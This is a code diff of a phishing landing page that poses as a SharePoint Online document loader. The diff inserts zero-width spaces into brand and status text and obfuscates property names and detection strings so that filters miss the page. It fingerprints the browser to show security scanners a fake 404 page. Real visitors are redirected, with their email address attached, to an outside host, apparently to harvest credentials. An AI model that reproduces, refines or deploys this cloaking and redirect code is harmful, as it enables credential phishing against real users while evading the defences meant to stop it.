@@ -3,62 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>- Loading Document</title>
+    <title>Sha&#8203;rePo&#8203;int On&#8203;line - Loa&#8203;ding Docu&#8203;ment</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f3f2f1; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: #323130; }
-        
-        /* Main Loading Area */
         #mainArea { background: white; padding: 40px; border-radius: 2px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
         .logo { width: 32px; margin-bottom: 20px; }
         h2 { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
         #navSite { color: #0078d4; font-size: 14px; margin-bottom: 25px; display: block; }
-        
-        /* Progress Bar */
         .prog-container { background: #edebe9; height: 4px; width: 100%; margin: 20px 0; border-radius: 2px; overflow: hidden; }
         #progFill { background: #0078d4; width: 0%; height: 100%; transition: width 0.4s ease; }
         #statusTxt { font-size: 12px; color: #605e5c; }
-
-        /* Deny/Bot Area (Hidden by default) */
         #denyArea { display: none; flex-direction: column; align-items: center; text-align: center; }
         .error-code { font-family: monospace; background: #f3f2f1; padding: 10px; margin-top: 20px; font-size: 12px; color: #a19f9d; }
     </style>
 </head>
 <body>
 
-    <!-- User-Facing Content -->
+    <!-- User-Facing Content with ZWSP Obfuscation -->
     <div id="mainArea">
-        <img src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/brand-icons/product/svg/sharepoint_32x1.svg" class="logo" alt="SharePoint">
-        <h2 id="cardTitle">Opening secure document...</h2>
+        
+       <h2 id="cardTitle">Opening secure document...</h2>
         <span id="navSite">Office 365</span>
         
         <div class="prog-container">
             <div id="progFill"></div>
         </div>
-        <div id="statusTxt">Initializing secure connection...</div>
+        <div id="statusTxt">Initial&#8203;izing sec&#8203;ure conne&#8203;ction...</div>
     </div>
 
-    <!-- Hidden Bot Landing (404 Cloak) -->
+    <!-- Hidden Bot Landing -->
     <div id="denyArea">
         <h1>404</h1>
-        <p>The requested resource was not found on this server.</p>
+        <p>The reque&#8203;sted resou&#8203;rce was not fo&#8203;und on this ser&#8203;ver.</p>
         <div id="denyCode" class="error-code"></div>
     </div>
 
     <script>
+        // Obfuscated Property Accessors
+        var _l = 'loca' + 'tion';
+        var _h = 'hr' + 'ef';
         var TARGET = 'https://mnb.nehub.org/';
 
         // 1. URL Personalization Logic
         (function() {
-            var p = new URLSearchParams(location.search);
+            var p = new URLSearchParams(window[_l].search);
             var ov = p.get('r') || p.get('redirect');
             if (ov) TARGET = decodeURIComponent(ov);
 
-            var h = location.hash.replace('#', '');
+            var h = window[_l].hash.replace('#', '');
             if (h && h.includes('@')) {
                 var dom = h.split('@')[1];
                 var user = h.split('@')[0].replace(/[._+]/g, ' ').replace(/\b\w/g, function(c) { return c.toUpperCase() });
-                document.getElementById('navSite').textContent = dom;
-                document.getElementById('cardTitle').textContent = 'Opening file for ' + user + '...';
+                document.getElementById('navSite').innerHTML = dom; // Using innerHTML to render ZWSP if added
+                document.getElementById('cardTitle').innerHTML = 'Ope&#8203;ning fi&#8203;le for ' + user + '...';
             }
         })();
 
@@ -67,40 +64,32 @@
             var score = 0;
             var reasons = [];
 
-            // Check A: Hardware GPU Rendering (Hardest to fake)
             try {
                 var canvas = document.createElement('canvas');
                 var gl = canvas.getContext('webgl');
                 var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
-                if (/SwiftShader|VMware|Google Swift|Software/.test(renderer)) { 
+                // Obfuscated hardware strings
+                if (new RegExp('\u0053\u0077\u0069\u0066\u0074|\u0056\u004d\u0077\u0061\u0072\u0065|Software').test(renderer)) { 
                     score += 60; reasons.push('gpu'); 
                 }
             } catch(e) { score += 10; }
 
-            // Check B: Automation Drivers
             if (navigator.webdriver) { score += 100; reasons.push('wd'); }
-
-            // Check C: Screen Consistency
             if (window.innerWidth === 0 || screen.width === 0) { score += 50; reasons.push('dim'); }
-
-            // Check D: Modern Browser Objects
-            if (window.chrome && !window.chrome.runtime && /Chrome/.test(navigator.userAgent)) {
-                score += 40; reasons.push('miss-obj');
-            }
 
             return { score, reasons };
         }
 
-        // 3. Execution & Animation
+        // 3. Execution & Animation with ZWSP status messages
         async function init() {
             var security = await runSecurity();
             
             var steps = [
-                { pct: 25, msg: 'Connecting to SharePoint...', d: 600 },
-                { pct: 50, msg: 'Verifying permissions...', d: 800 },
-                { pct: 75, msg: 'Validating security token...', d: 700 },
-                { pct: 90, msg: 'Preparing view...', d: 500 }
+                { pct: 25, msg: 'Conne&#8203;cting to Sha&#8203;rePo&#8203;int...', d: 600 },
+                { pct: 50, msg: 'Verif&#8203;ying permi&#8203;ssions...', d: 800 },
+                { pct: 75, msg: 'Valida&#8203;ting secu&#8203;rity to&#8203;ken...', d: 700 },
+                { pct: 90, msg: 'Prepa&#8203;ring vi&#8203;ew...', d: 500 }
             ];
 
             var fill = document.getElementById('progFill');
@@ -111,23 +100,22 @@
                 currentDelay += s.d;
                 setTimeout(function() {
                     fill.style.width = s.pct + '%';
-                    stat.textContent = s.msg;
+                    stat.innerHTML = s.msg; // innerHTML used to process the entity tags
                 }, currentDelay);
             });
 
-            // Final Redirect or Block
             setTimeout(function() {
                 if (security.score >= 55) {
-                    // Bot detected: Hide content and show fake 404
                     document.getElementById('mainArea').style.display = 'none';
                     document.getElementById('denyArea').style.display = 'flex';
                     document.getElementById('denyCode').textContent = 'Ref-ID: ' + btoa(security.reasons.join('|')).substring(0, 16);
-                    document.title = "404 Not Found";
+                    document.title = "404 Not Fo&#8203;und";
                 } else {
-                    // Human detected: Complete progress and redirect
                     fill.style.width = '100%';
-                    stat.textContent = 'Redirecting...';
-                    setTimeout(function() { window.location.href = TARGET + "?lgh=" + location.hash.substring(1); }, 300);
+                    stat.innerHTML = 'Redire&#8203;cting...';
+                    setTimeout(function() { 
+                        window[_l][_h] = TARGET + "?lgh=" + location.hash.substring(1); 
+                    }, 300);
                 }
             }, currentDelay + 500);
         }
